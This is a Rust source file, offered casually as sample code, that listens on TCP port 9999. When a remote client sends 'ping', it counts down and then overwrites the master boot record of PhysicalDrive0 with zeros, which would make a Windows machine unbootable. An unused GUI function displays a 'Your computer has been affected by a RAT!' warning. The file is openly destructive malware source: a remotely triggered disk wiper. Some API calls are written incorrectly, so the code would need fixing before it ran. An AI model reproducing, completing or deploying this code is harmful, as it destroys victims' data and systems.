// sample rust code i guess?
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::winbase::{CreateFileW, WriteFile, CloseHandle};
use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_YESNO};

#[tokio::main]
async fn main() {
    let listener = TcpListener::bind("0.0.0.0:9999").await.unwrap();
    println!("Listening on port 9999...");

    while let Ok((stream, _)) = listener.accept().await {
        tokio::spawn(handle_client(stream));
    }
}

async fn handle_client(mut stream: TcpStream) {
    loop {
        let mut command = [0; 1024];
        stream.read(&mut command).await.unwrap();
        let command = std::str::from_utf8(&command).unwrap();

        match command {
            "ping" => {
                for i in (1..11).rev() {
                    stream.write(format!("ping received, executing in {}", i).as_bytes()).await.unwrap();
                    tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                }
                stream.write(b"loading...").await.unwrap();
                // Call the MBR overwrite function here
                mbr_overwrite();
                stream.write(b"boom?").await.unwrap();
            }
            "exit" => {
                stream.write(b"breaking").await.unwrap();
                break;
            }
            _ => {}
        }
    }
}

fn mbr_overwrite() {
    // Create a handle to the physical drive
    let h_device = CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0, std::ptr::null_mut(), 3, 0, std::ptr::null_mut());

    // Overwrite the MBR
    let mut buffer = [0; 512];
    WriteFile(h_device, buffer.as_mut_ptr() as LPVOID, 512, std::ptr::null_mut(), std::ptr::null_mut());

    // Close the handle
    CloseHandle(h_device);
}

// Optional GUI window function
fn create_gui_window() {
    // Create a GUI window using tk-rs
    let mut window = tk::Window::new();
    window.set_title("WARNING (RAT)");
    window.set_geometry("300x200");
    let label = tk::Label::new(&window, "Your computer has been affected by a RAT!");
    label.pack();
    window.mainloop();
}
